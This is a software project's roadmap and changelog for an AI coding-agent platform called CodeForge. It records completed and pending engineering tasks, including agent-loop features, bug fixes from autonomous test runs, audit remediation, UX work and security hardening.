- [x] STUB-010: SWE-agent backend adapter implementation (`workers/codeforge/backends/sweagent.py`) (2026-03-17)

**Small Effort (new from 2026-03-18 scan):**
- [x] STUB-024: Wire re-run benchmark button onClick in PromptOptimizationPanel (2026-03-18)
- [x] STUB-025: Remove deprecated `activeTool` prop from CanvasModal interface (2026-03-18)
- [x] Cleanup: Delete dead code `internal/port/a2a/` (zero imports, merge artifact) (2026-03-18)
- [x] STUB-004 (remaining): Wire BudgetPercent from event store accumulated cost (2026-03-18)

**No Action Needed (intentional designs):**
- STUB-007/008: GitHub OAuth + Subscription 501 gates (feature-gated by design)
- STUB-013/014/015: Intentional no-ops (_BenchmarkRuntime, StubBackendExecutor.cancel, useCRUDForm fallback)
- STUB-016-023, STUB-026: Documentation TODOs and intentional config exclusions

**Modular Prompt System (Phases A-F)**
- [x] Phase A: Domain types (PromptEntry, AssemblyContext, Category, Conditions) + YAML loader + tests (2026-03-17)
- [x] Phase B: PromptAssembler + PromptLibraryService + wiring into buildSystemPrompt + tests (2026-03-17)
- [x] Phase C: Write 56 embedded YAML prompt library files across 12 categories (2026-03-17)
- [x] Phase D: Migrate 24 mode PromptPrefix strings to YAML library files (2026-03-17)
- [x] Phase E: System reminders in NATS payload and prompt pipeline (2026-03-17)
- [x] Phase F: Wire assembler at app startup, add PromptsFS() accessor, integration tests (2026-03-17)

#### Codebase-Wide Lint Cleanup (2026-03-18)

- [x] Go: Fix all 50 golangci-lint issues (errcheck, gocritic hugeParam/rangeValCopy/appendCombine, gosec G118 nolint) (2026-03-18)
- [x] TypeScript: Fix all 21 ESLint issues (18 SolidJS reactivity warnings, 3 config parsing errors) (2026-03-18)
- [x] Config: golangci-lint exclusions for frontend/node_modules + G117/G118 test rules (2026-03-18)
- [x] Audit: Reviewed ~220+ linter suppression comments across Go/Python/TypeScript -- all justified (2026-03-18)

---

### Quality & Performance Improvements (2026-03-18)

> Spec: `docs/specs/2026-03-18-quality-performance-improvements-design.md`
> Based on: Current LLM-for-coding research (2025/26), codebase analysis, identified gaps
> 12 measures, 90+ atomic TODOs, 5 implementation phases

#### Phase 1 — Quick Wins (COMPLETED 2026-03-18)

**A1: Stall Detection + Escape** -- COMPLETED (2026-03-18)
- [x] A1.1-A1.4: Write 22 stall detection tests (identical calls, args hash, escape injection, double-stall abort, edge cases)
- [x] A1.5: Implement `StallDetector` class (~50 lines, deque-based sliding window) — now in `workers/codeforge/stall_detection.py`
- [x] A1.6: Integrate into `AgentLoopExecutor.run()` with `_check_stall()` helper (cyclomatic complexity managed)
- [x] A1.7: Publish `trajectory.stall_detected` event via `_runtime.publish_trajectory_event()`
- [x] A1.8: 60/60 tests pass (22 new + 33 existing agent loop + 5 related)

**B3: Adaptive Context Budget Based on Task Complexity** -- COMPLETED (2026-03-18)
- [x] B3.1-B3.3: Write 17 tests (9 budget mapping + 8 complexity classifier including edge cases)
- [x] B3.4: Implement `ClassifyComplexity()` in `internal/service/complexity.go` (240 lines, 7 heuristics + task-type boost)
- [x] B3.5: Implement `ComplexityBudget()` in `internal/service/context_budget.go` (composes with PhaseAware + Adaptive)
- [x] B3.6: NATS payload integration deferred to Phase 2 (Go-side functions ready)
- [x] B3.7: All Go service tests pass, golangci-lint clean

**C2: Confidence-Based Early Stopping for Multi-Rollout** -- COMPLETED (2026-03-18)
- [x] C2.1-C2.5: Write 15 early stopping tests (quorum, threshold, exit_code, rollout_count<=3, clusters, best selection)
- [x] C2.6: Implement `EarlyStopChecker` class in `workers/codeforge/evaluation/runners/early_stopping.py`
- [x] C2.7: Integrate into `MultiRolloutRunner.run()` with `MultiRolloutMetadata` dataclass
- [x] C2.8: Add `CODEFORGE_EARLY_STOP_THRESHOLD` / `CODEFORGE_EARLY_STOP_QUORUM` env vars
- [x] C2.9: 35/35 tests pass (15 new + 20 existing runner tests)

#### Phase 2 — Core Quality (A1 helps validate, ~8h total)

**A3: Plan/Act Mode Toggle (~5h)** -- DONE 2026-03-18
- [x] A3.1-A3.5: Write plan/act tests (tool restriction, phase transition, max iterations, autonomy, routing tags) -- 29 Python + 8 Go tests
- [x] A3.6: Add `plan_act_enabled` to NATS payload (`internal/port/messagequeue/schemas_conversation.go` + `models.py`)
- [x] A3.7: Set `plan_act_enabled` based on `modeAutonomy >= 4` in dispatcher (`conversation_agent.go`)
- [x] A3.8: Implement `PlanActController` class in `workers/codeforge/plan_act.py`
- [x] A3.9: Integrate into `run()` and `_do_llm_iteration()` in `agent_loop.py`
- [x] A3.10-A3.11: Add `CODEFORGE_PLAN_ACT_MAX_ITERATIONS` env var (default 10) + all tests passing

**B2: Semantic Deduplication of Context Candidates (~3h)** ✅ 2026-03-18
- [x] B2.1-B2.3b: Write dedup tests (overlapping lines, cross-file, no-dupes, simhash edge cases) — 26 tests in `dedup_test.go`
- [x] B2.4: Implement `simhash64()` + `hammingDistance()` in `internal/service/dedup.go`
- [x] B2.5: Implement `deduplicateCandidates()` in `dedup.go`
- [x] B2.6: Integrate into `assembleAndPack()` in `context_optimizer.go`
- [x] B2.7: Run regression tests — all 11 context optimizer tests pass

#### Phase 3 — Context Intelligence (COMPLETED)

**B1: LLM-Based Re-Ranking of Retrieval Results**
- [x] (2026-03-18) B1.1-B1.4: Write reranker tests (reorder, prompt format, fallback, routing tags)
- [x] (2026-03-18) B1.5: Add NATS subjects in `queue.go` + `_subjects.py`
- [x] (2026-03-18) B1.6: Implement `ContextReranker` in `workers/codeforge/context_reranker.py`
- [x] (2026-03-18) B1.7-B1.7b: Add NATS handler (`ContextHandlerMixin`) + Go integration test
- [x] (2026-03-18) B1.8: Integrate into Go `ContextOptimizerService` (syncWaiter + `assembleAndPack()`)
- [x] (2026-03-18) B1.9-B1.11: Add config (`CODEFORGE_CONTEXT_RERANK_ENABLED/MODEL`) + verify JetStream + run tests

**A2: Conversation Summarization at Context Exhaustion**
- [x] (2026-03-18) A2.1-A2.4: Write summarization tests (threshold, tail preservation, prompt, routing tags)
- [x] (2026-03-18) A2.5: Implement `ConversationSummarizer` class in `workers/codeforge/history.py`
- [x] (2026-03-18) A2.6: Implement `_summarize_history()` async method
- [x] (2026-03-18) A2.7: Add `async summarize_if_needed()` pre-processing step in `_conversation.py`
- [x] (2026-03-18) A2.8: Add `CODEFORGE_SUMMARIZE_THRESHOLD` env var + wire into NATS payload
- [x] (2026-03-18) A2.9: Run regression tests (16 new tests pass, no regressions)

#### Phase 4 — Advanced Features (COMPLETED 2026-03-18)

**C1: Routing Transparency + Mid-Loop Model Switching (COMPLETED 2026-03-18)**
- [x] (2026-03-18) C1.1-C1.4: Write routing transparency + quality signal + model switch tests — 7 new tests in `test_routing_transparency.py`
- [x] (2026-03-18) C1.5: `route_with_metadata()` on `HybridRouter` — `workers/codeforge/routing/router.py`, returns `RoutingMetadata`
- [x] (2026-03-18) C1.6: `IterationQualityTracker` class — now in `workers/codeforge/quality_tracking.py`, integrated into `run()`
- [x] (2026-03-18) C1.7: Wired `route_with_metadata()` into agent loop via `RoutingResult.routing_metadata` → `LoopConfig` → `_publish_routing_decision()` trajectory event
- [x] (2026-03-18) C1.8: 132/132 tests pass (23 routing + 33 agent loop + 67 routing/fallback + 34 consumer dispatch), zero regressions

**A4: Inference-Time Scaling for Conversations (COMPLETED 2026-03-18)**
- [x] (2026-03-18) A4.1-A4.5b: 27 rollout tests in `test_conversation_rollout.py` (single, multi, selection, early stopping, cost, non-git fallback, snapshot/restore, clamping, trajectory metadata)
- [x] (2026-03-18) A4.6: `rollout_count` in Go NATS payload (`internal/port/messagequeue/schemas_conversation.go`) + Python `ConversationRunStartMessage` (`models.py:488`)
- [x] (2026-03-18) A4.7: `Agent.ConversationRolloutCount` config (`config.go:151`), env var `CODEFORGE_AGENT_CONVERSATION_ROLLOUT_COUNT`, default 1
- [x] (2026-03-18) A4.8: `ConversationRolloutExecutor` (`agent_loop.py`) with `EarlyStopChecker`, non-git fallback
- [x] (2026-03-18) A4.9: `_snapshot_workspace()` + `_restore_workspace()` (`agent_loop.py`) via git stash
- [x] (2026-03-18) A4.10: NATS consumer dispatch wired — `rollout_count > 1` triggers `ConversationRolloutExecutor` in `_conversation.py:279-290`, clamped `max(1, min(count, 8))`
- [x] (2026-03-18) A4.11-A4.12: `trajectory.rollout_complete` event with rollout_count, selected_index, scores, early_stopped; NATS contract fixture updated; 128/128 tests pass

#### Phase 5 — Ecosystem (COMPLETED)

**C3: New Benchmark Providers — DPAI Arena + Terminal-Bench (~6h)**
- [x] (2026-03-18) C3.1-C3.2: Research dataset formats and access methods
- [x] (2026-03-18) C3.3-C3.4: Write provider load tests (20 DPAI Arena + 21 Terminal-Bench + 15 Filesystem State = 56 tests)
- [x] (2026-03-18) C3.5: Implement `DPAIArenaProvider` (BenchmarkType.SIMPLE, HuggingFace DPAI/arena dataset)
- [x] (2026-03-18) C3.6: Implement `TerminalBenchProvider` (BenchmarkType.AGENT, filesystem state verification)
- [x] (2026-03-18) C3.7: Add `FilesystemStateEvaluator` for Terminal-Bench (expected files, content match, missing files)
- [x] (2026-03-18) C3.8-C3.9: Update Go `defaultSuites` + all tests pass

**C4: RLVR Training Pipeline Export (~8h)**
- [x] (2026-03-18) C4.1-C4.4: Write RLVR export tests (19 Python + 13 Go service + 4 Go handler = 36 tests)
- [x] (2026-03-18) C4.5: Implement `compute_rlvr_reward()` (weighted avg, functional_test 2x, clamped [0,1])
- [x] (2026-03-18) C4.6: Implement `format_rlvr_entry()` formatter + `RLVRExporter` class
- [x] (2026-03-18) C4.7: Implement `ExportRLVRDataset()` in Go service + `ComputeRLVRReward()`
- [x] (2026-03-18) C4.8-C4.10: Add `GET /api/v1/benchmarks/runs/{id}/export/rlvr` endpoint (JSONL + JSON)
- [x] (2026-03-18) C4.11: Full test suite passes (87 Python, all Go packages green)

#### Claude Code Integration

- [x] Claude Code as routing target with execution branch (2026-03-18)
  - ClaudeCodeExecutor with SDK + CLI fallback
  - Policy enforcement via can_use_tool callback
  - COMPLEXITY_DEFAULTS: claudecode/default in COMPLEX + REASONING
  - Availability detection with caching
- [ ] Claude Code: E2E manual test with live CLI
- [x] (2026-03-19) Claude Code: model selection override (claudecode/claude-sonnet-4) <!-- audit: implemented in claude_code_executor.py + conversation routing -->
- [x] Claude Code: read CODEFORGE_CLAUDECODE_MAX_TURNS, _TIMEOUT, _TIERS from env (2026-03-18)
- [x] Claude Code: update docs/dev-setup.md with new env vars (2026-03-18)

#### UX/UI Audit Implementation (COMPLETED 2026-03-18)

> 17 atomic tasks across 3 layers implementing UX/UI improvements.

**Layer 1 — Quick Wins (6 tasks):**
- [x] (2026-03-18) Q1: Added anvil SVG favicon (`frontend/public/favicon.svg`)
- [x] (2026-03-18) Q2: Per-page document titles (17 pages)
- [x] (2026-03-18) Q3: Fixed Prompts Preview button variant (ghost -> secondary)
- [x] (2026-03-18) Q4: Debounced WebSocket reconnect banner (2s delay + 3s initial suppress)
- [x] (2026-03-18) Q5: Abbreviated KPI labels for mobile viewport
- [x] (2026-03-18) Q6: Hover effects + click-to-navigate on project cards

**Layer 2 — Medium-Term (7 tasks):**
- [x] (2026-03-18) M1: SVG empty state illustrations for 6 pages (MCP, Knowledge, Benchmarks, Prompts, Activity, Costs)
- [x] (2026-03-18) M2: Page transition fade-in animations (PageTransition component)
- [x] (2026-03-18) M3: Skeleton loaders replacing "Loading..." text on AI Config, Costs, Settings
- [x] (2026-03-18) M4: Sticky section navigation on Settings page (9 sections, IntersectionObserver)
- [x] (2026-03-18) M5: Project Detail graceful degradation (per-panel ErrorBoundary)
- [x] (2026-03-18) M6: Anvil brand mark in sidebar header (CodeForgeLogo component)
- [x] (2026-03-18) M7: Collapsible model cards on AI Config page (expand/collapse all)

**Layer 3 — Strategic (4 tasks):**
- [x] (2026-03-18) S1: Typography system -- Outfit (display) + Source Sans 3 (body), self-hosted woff2 in `frontend/public/fonts/`
- [x] (2026-03-18) S2: Micro-interactions -- button press, card hover lift, tab animation, KPI count-up, toast slide-in, modal fade+scale
- [x] (2026-03-18) S3: Living design system page at `/design-system` (dev-mode only) + `frontend/src/ui/DESIGN-SYSTEM.md`
- [x] (2026-03-18) S4: 3-step onboarding wizard for first-time users (Connect Code -> Configure AI -> Create Project)

---

#### Bugs Found During Autonomous Goal-to-Program Test (2026-03-19)

> Discovered during S1 testplan execution (`docs/testing/autonomous-goal-to-program-testplan.md`).
> These are product bugs blocking autonomous agent execution end-to-end.

**Bug 1 — Model Router ignores LiteLLM health status (Priority: HIGH) — FIXED 2026-03-19**
- [x] (2026-03-19) `model_resolver.py` now queries `/health` endpoint and prefers healthy models over alphabetically first
- [x] (2026-03-19) `key_filter.py` now accepts models known healthy from LiteLLM `/health` even without API key (covers local LM Studio via `openai/container`)
- [x] (2026-03-19) `_conversation.py:144` explicit `model` from NATS payload now takes precedence over routing; routing only applies when no explicit model set
- [x] (2026-03-19) Health-aware model selection added via `_fetch_healthy_models()` in `model_resolver.py`

**Bug 2 — NATS JetStream backlog from cancelled conversations blocks new runs (Priority: CRITICAL) — FIXED 2026-03-19**
- [x] (2026-03-19) `handleConversationToolCall` now fast-rejects tool calls for cancelled conversation runs via `RunStateManager.cancelledConvs` (`internal/service/run_state.go`); the flag is cleared when the next run starts (KI-24, fixed 2026-09-30)
- [x] (2026-03-19) `StopConversation` HTTP handler calls `Runtime.MarkConversationRunCancelled()` which also cleans up HITL approval channels
- [ ] Consider per-conversation NATS subjects or consumer groups to prevent cross-conversation blocking (future improvement)

**Bug 3 — Worker env var naming inconsistency (Priority: LOW) — FIXED 2026-03-19**
- [x] (2026-03-19) `LITELLM_URL` vs `LITELLM_BASE_URL` — code reads `LITELLM_BASE_URL`, documented in testplan (the devcontainer still sets `LITELLM_URL`, see [KI-50](#known-issues))
- [x] (2026-03-19) `_conversation.py` inline env reads replaced with `self._litellm_url` from constructor
- [x] (2026-03-19) `_benchmark.py` inline env reads replaced with `WorkerSettings().litellm_url`

**Bug 4 — Onboarding agent blocks project setup (Priority: MEDIUM) — FIXED 2026-03-19**
- [x] (2026-03-19) `goal_researcher` mode autonomy changed from 2 (semi-auto) to 4 (full-auto) — tool calls auto-approve
- [ ] HITL approval cards for `list_directory`/`glob_files` tools are not visible in chat UI (tool calls time out silently after 60s) — separate UI bug
- [x] (2026-03-19) Zombie NATS messages from cancelled conversations now fast-rejected (see Bug 2 fix)

**Bug 5 — WSL2 Docker port mapping unreachable from host (Priority: LOW, environment-specific) — FIXED 2026-03-19**
- [x] (2026-03-19) Documented in testplan Phase 0 — container IPs must be used instead of localhost
- [ ] Add `dev-setup.md` section for WSL2-specific Docker networking workarounds
- [x] (2026-03-19) Created `scripts/resolve-docker-ips.sh` helper that exports correct env vars

#### Multi-Language Autonomous Testplan (2026-03-22)

> Design spec: `docs/specs/2026-03-22-autonomous-multi-language-testplan-design.md`
> Testplan: `docs/testing/autonomous-multi-language-testplan.md`
> Implementation plan: `docs/plans/2026-03-22-autonomous-multi-language-testplan.md`

- [x] (2026-03-22) Research: AI coding agent benchmarks + showcase demos (SWE-bench, Commit0, DevBench, Devin, MetaGPT, Codex, etc.)
- [x] (2026-03-22) Design spec: 10 phases, 2 modes (A: Weather Dashboard, D: Free Choice), 4-tier verification
- [x] (2026-03-22) Implementation plan: 11 tasks, 28 steps
- [x] (2026-03-22) Executable runbook: 11 phases with Playwright-MCP commands, decision trees, report template
- [x] (2026-03-22) First test run: Mode A (Weather Dashboard) with local model (`lm_studio/qwen/qwen3-30b-a3b`) — `docs/testing/2026-03-22-multi-language-autonomous-report.md`, `docs/testing/2026-03-23-multi-language-autonomous-report.md`
- [x] (2026-03-23) First test run: Mode A with cloud model (`groq/llama-3.1-8b-instant`, not Claude/GPT) — `docs/testing/2026-03-23-run4b-multi-language-report.md`
- [ ] First test run: Mode D (Free Choice)

#### Universal Audit Remediation (2026-03-23)

> Audit report: `docs/audits/2026-03-23-universal-audit-report.md`
> 11 commits, 57 files changed, +3287 / -863 lines

**Resolved Findings:**
- [x] (2026-03-23) **F-002 (CRITICAL):** Hexagonal architecture violation -- event types moved from `adapter/ws/events.go` to `internal/domain/event/` (broadcast.go, broadcast_payloads.go, agui.go). OTEL span helpers moved from `adapter/otel/spans.go` to `internal/telemetry/spans.go`. LSP service decoupled via `port/codeintel/provider.go` interface + `adapter/lsp/noop.go` fallback
- [x] (2026-03-23) **F-008 (HIGH):** Silenced database errors -- 38 `_ = s.store.*` calls in service layer replaced with `logBestEffort` helper (`internal/service/log_best_effort.go`) that logs non-fatal errors with structured context
- [x] (2026-03-23) **F-010 (HIGH):** Test coverage gaps -- 2384 LOC new tests: `runtime_execution_test.go` (903 LOC), `runtime_lifecycle_test.go` (904 LOC), `test_conversation_handler.py` (577 LOC)
- [x] (2026-03-23) **F-033 (MEDIUM):** Handler struct concrete types -- `Handlers.LiteLLM *litellm.Client` replaced with `Handlers.LLM llm.Provider`, `Handlers.Copilot *copilot.Client` replaced with `Handlers.TokenExchanger tokenexchange.Exchanger`
- [x] (2026-03-23) **F-034 (MEDIUM):** Event types in adapter layer -- moved to `internal/domain/event/` (55 event constants + 49 payload structs)

**Remaining Findings — Remediation Work Plans (2026-03-27):**

> Audit: the F-IDs below come from the 45-finding version of 2026-03-27 (commit 43372899); the current
> `docs/audits/2026-03-27-universal-audit-report.md` is a 77-finding re-run with SEC-/QUAL-/ARCH-/INFRA-/COMP- IDs.
> Work plans: `docs/plans/2026-03-27-audit-remediation-workplans.md` (22 worktrees; WT-11..WT-22 are tracked there).
> Still-open findings re-verified on 2026-09-29 are tracked as [Known Issues](#known-issues): INFRA-001 → KI-47,
> INFRA-002 → KI-44, SEC-003/SEC-004/INFRA-007/INFRA-008 → KI-14, SEC-008 (WT-12) → KI-12, COMP-014 → KI-54.

**Tier 1 — CRITICAL (parallel):**
- [x] (2026-03-27, 0de61dbf) **WT-1 `fix/config-secrets`:** F-001/F-003/F-012/F-013/F-018 — `json:"-"` on 10 config fields, JWT blocklist, clear codeforge.yaml secrets, sslmode staging rejection
- [x] (2026-03-27, 15a2efaf) **WT-2 `fix/nats-trajectory-duplicate`:** F-002 — remove duplicate trajectory subscription, add missing `roadmap_proposed`/`subagent_requested` handlers

**Tier 2 — HIGH (parallel after Tier 1):**
- [x] (2026-03-27, 80cbf266) **WT-3 `fix/gdpr-compliance`:** F-008/F-025/F-026/F-027 — audit log anonymization (ADR-009), GDPR service tests, IP retention 180d (residual defects KI-52, KI-53 fixed 2026-09-30)
- [x] (2026-03-27, deb9863c) **WT-4 `fix/error-handling`:** F-007/F-020 — dashboard swallowed errors (logBestEffort), dead model resolution
- [ ] **WT-5 `refactor/hexagonal-handlers`** (partial): F-005/F-015/F-016 — AllowAlways extracted to PolicyService (2026-03-27, a024c503); remaining: move `os.ReadFile` / `os.MkdirAll` / `os.Remove` out of `handlers_goals.go`, `handlers_policy_crud.go` and `PolicyService.AllowAlways` behind the filesystem port
- [x] (2026-03-27) **WT-6 `test/auth-token`:** F-009 — 11 auth token lifecycle tests in `internal/service/auth_token_test.go`
- [ ] Add refresh-token reuse-detection and concurrent-refresh race tests (planned in WT-6, not written)
- [ ] **WT-7 `fix/frontend-compliance`** (partial): F-010/F-036/F-041 — AGPL source link and aria-labels done (2026-03-27, 1875625d); remaining: route the `fetch()` calls in `features/chat/commandStore.ts` and `features/project/RefactorApproval.tsx` through the API client (see [KI-17](#known-issues))

**Tier 3 — MEDIUM (after WT-5):**
- [x] (2026-03-27, 892da44e) **WT-8 `fix/infra-hardening`:** F-004/F-014/F-031/F-040 — JetStream retention limits, Prometheus alerts, backup encryption
- [ ] **WT-9 `refactor/type-safety`:** F-019/F-021/F-022/F-037/F-038/F-039 — Python Protocols, Go response structs, flatten nesting

**Tier 4 — BACKLOG (after WT-2):**
- [ ] **WT-10 `refactor/god-objects`:** F-006/F-017 — Store ISP decomposition, RuntimeService/ConversationService split

---

#### Frontend Feature Pages & Prompt Evolution (COMPLETED 2026-03-23)

- [x] (2026-03-23) **MicroagentsPage:** UI for managing YAML+Markdown trigger-driven microagents -- `frontend/src/features/microagents/MicroagentsPage.tsx`
- [x] (2026-03-23) **QuarantinePage:** Admin review UI for Phase 23B message quarantine (risk scores, evaluate/approve/reject) -- `frontend/src/features/quarantine/QuarantinePage.tsx`
- [x] (2026-03-23) **A2APage:** Frontend for Phase 27 A2A v0.3.0 agent federation (remote agents, task history, AgentCard details) -- `frontend/src/features/a2a/A2APage.tsx`
- [x] (2026-03-23) **RoutingStatsPage:** Live statistics for Phase 29 hybrid routing (model distribution, fallback events, MAB UCB1 scores) -- `frontend/src/features/routing/RoutingStatsPage.tsx`
- [x] (2026-03-23) **Prompt Evolution:** LLM-driven prompt improvement pipeline -- reflect/mutate cycles via NATS. Files: `frontend/src/features/prompts/EvolutionTab.tsx`, `internal/service/prompt_evolution.go`, `workers/codeforge/consumer/_prompt_evolution.py`, migration 078

---

#### Frontend Cleanup (2026-03-24)

- [x] (2026-03-24) **FIX-106:** Extracted inline SVG icons from ChatPanel.tsx into `frontend/src/ui/icons/ChatIcons.tsx` (AttachIcon, CanvasIcon)
- [x] (2026-03-24) **useCRUDForm fix:** Replaced silent `async () => {}` fallback with dev-mode console.warn in `frontend/src/hooks/useCRUDForm.ts`

#### Security Hardening (2026-03-24)

- [x] (2026-03-24) **FIX-093:** Add `force_secure_cookies` config flag to `Server` struct -- unconditionally set `Secure=true` on cookies for TLS-terminating proxy deployments. Refactored `isSecureRequest` into `isSecureRequestWithConfig` + `isSecureCookie` method on Handlers. Files: `internal/config/config.go`, `internal/adapter/http/handlers_auth.go`, `internal/adapter/http/handlers.go`
- [x] (2026-03-24) **FIX-096:** Add per-user rate limiting keyed on JWT user ID -- composite key `userID:IP` for authenticated requests, IP-only fallback for unauthenticated (the IP part was spoofable until 2026-09-29, [KI-11](#known-issues)). Auth middleware injects user ID into context at all 5 auth paths. Files: `internal/middleware/ratelimit.go`, `internal/middleware/auth.go`

#### v2 API Migration Design (2026-03-24)

- [x] (2026-03-24) v2 API migration design document (`docs/specs/v2-api-migration-design.md`) -- FIX-061/063/095/098/100

#### Playwright-MCP Frontend Testing & Bugfixes (2026-03-24)

> Full test report: `docs/testing/2026-03-24-autonomous-goal-to-program-report.md`

- [x] (2026-03-24) **S2 Autonomous Test Run:** Executed S2 (Medium — Build Your Own `cut` Tool) via agentic chat with `lm_studio/qwen/qwen3-30b-a3b`. 18 tool calls, 1 git commit, package structure correct. Result: PARTIAL (file read scope bug in agent output). Report: `docs/testing/2026-03-24-autonomous-goal-to-program-report.md`
- [x] (2026-03-24) **FIX: migration 077** — `CREATE SEQUENCE agent_events_seq_number_seq` fails on restart after partial migration. Added `IF NOT EXISTS` to both `ADD COLUMN` and `CREATE SEQUENCE`. File: `internal/adapter/postgres/migrations/077_add_agent_events_sequence_number.sql`
- [x] (2026-03-24) **Playwright-MCP full frontend test** — tested 20/22 routes with real browser interactions (login, CRUD, forms, tabs, theme, locale). Found and fixed 7 bugs:
  - `App.tsx`: missing `</NavLink>` closing tag for A2A nav link
  - `api/client.ts`, `api/resources/index.ts`, `api/types.ts`: 3 leftover merge conflict markers (`>>>>>>> feat/frontend-prompt-evolution`)
  - `api/types.ts`: missing closing `}` for `QuarantineReviewRequest` interface
  - `ui/layout/NavIcons.tsx`: `MicroagentsIcon` missing `</svg>`, `);`, `}` — `RoutingIcon` function started inside it
  - `features/project/FilePanel.tsx`: `useFileTree()` called outside `FileTreeProvider` scope — wrapped component in provider

#### Project Detail UX Improvements (2026-03-24)

> UX test report: `docs/testing/2026-03-24-project-detail-ux-report.md`
> UX testplan: `docs/testing/project-detail-ux-testplan.md`

- [x] (2026-03-24) **Project Detail UX Test:** 37 features tested across 8 phases via Playwright-MCP. 35 PASS, 2 FAIL (Pull/Auto-Agent errors). Report: `docs/testing/2026-03-24-project-detail-ux-report.md`
- [x] (2026-03-24) **FIX: Pull button** returns "internal server error" on local projects → now returns 400 with "no remote configured — add a remote with 'git remote add origin <url>'" (`internal/service/project.go`)
- [x] (2026-03-24) **FIX: Auto-Agent** returns 404 when no roadmap exists → now returns 400 with "create a roadmap with features before starting auto-agent" (`internal/service/autoagent.go`)
- [x] (2026-03-24) **FIX: Goal delete confirmation** — added `useConfirm` dialog before goal deletion to prevent accidental data loss (`features/project/GoalsPanel.tsx`)
- [x] (2026-03-24) **Grouped Panel Selector** — replaced native `<select>` (SolidJS strips `<optgroup>`) with custom dropdown using Portal + inline styles. 4 groups (Planning/Execution/Intelligence/Governance), 14 panels with one-line descriptions (`features/project/ProjectDetailPage.tsx`)

#### AI Pipeline E2E Test & Event-Flow Fixes (2026-03-24)

- [x] (2026-03-24) **E2E AI Goal Discovery Test:** LLM reads codebase via `read_file`, proposes 3 goals via `propose_goal` tool (Add Math Ops, Testing, Documentation). Verified with `lm_studio/qwen/qwen3-30b-a3b`.
- [x] (2026-03-24) **BUG: AI Discover without explicit model** selects weak model (`groq/llama-3.1-8b`) → produces empty responses. With explicit tool-capable model, works correctly.
- [x] (2026-03-24) **FIX: Goal auto-persist broken** — `runtimeSvc.SetGoalService(goalSvc)` was never called in `main.go`, so `s.goalSvc == nil` and auto-persist was silently skipped. Added the missing wiring.
- [x] (2026-03-24) **FIX: Trajectory event UUID error** — `AgentEvent.AgentID` and `TaskID` were empty strings for conversation-based runs, causing `invalid input syntax for type uuid` on INSERT. Fixed by using `RunID` as fallback (`internal/service/runtime.go`).
- [x] (2026-03-24) **FIX: AI Discover model selection** — Handler now accepts optional `model` field in request body, passed via `WithModel()`. Prevents auto-selection of weak models that can't use tools (`internal/adapter/http/handlers_goals.go`).
- [x] (2026-03-24) **FIX: GoalProposalCard wiring** — `onAIDiscoverStarted` callback connected: GoalsPanel → ProjectDetailPage → ChatPanel `switchToConversation` signal. Chat auto-switches to goal-discovery conversation so AG-UI events match.
- [x] (2026-03-24) **FIX: Panel dropdown clicks** — SolidJS `onClick` (delegated) races with `document.addEventListener("click")` in Portal. Changed to `on:click` (native, direct) which fires before delegation. Options now register clicks correctly.
